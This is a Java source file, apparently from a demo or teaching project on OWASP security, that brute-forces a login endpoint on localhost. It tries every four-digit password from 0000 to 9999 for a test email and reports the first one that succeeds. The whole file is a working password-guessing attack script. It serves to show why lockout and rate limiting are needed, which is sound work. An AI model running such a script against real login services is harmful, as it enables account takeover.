package com.example.owaspkryptering.Security;

import okhttp3.*;
import okhttp3.logging.HttpLoggingInterceptor;
import org.json.JSONObject;

import java.io.IOException;
import java.util.Arrays;

public class JsonBruteForceExample {

    public static final MediaType JSON = MediaType.get("application/json; charset=utf-8");;

    public static void main(String[] args) {

        String userEmail = "one@test.se";

        HttpLoggingInterceptor loggingInterceptor = new HttpLoggingInterceptor();
        loggingInterceptor.setLevel(HttpLoggingInterceptor.Level.BASIC);

        OkHttpClient client = new OkHttpClient.Builder()
                .protocols(Arrays.asList(Protocol.HTTP_1_1, Protocol.HTTP_2))
                .addInterceptor(loggingInterceptor)
                .build();

        for (int i = 0; i <= 9999; i++) {
            String password = String.format("%04d", i);
            if (attemptLogin(client, userEmail, password)) {
                System.out.println("Success with password: " + password);
                break;
            }
        }
    }

    public static synchronized boolean attemptLogin(OkHttpClient client, String email, String password) {
        JSONObject jsonObject = new JSONObject();
        jsonObject.put("password", password);
        jsonObject.put("email", email);

        String jsonString = jsonObject.toString();
        RequestBody body = RequestBody.create(jsonString, JSON);

        Request request = new Request.Builder()
                .url("http://localhost:8080/login")
                .post(body)
                .build();

        try {
            Thread.sleep(1000);
            Response response = client.newCall(request).execute();
            if (response.isSuccessful()) {
                String responseBody = response.body().string();
                return responseBody.contains("Login Successful");
            } else {
                return false;
            }
        } catch (IOException e) {
            return false;
        } catch (InterruptedException e) {
            throw new RuntimeException(e);
        }
    }
}
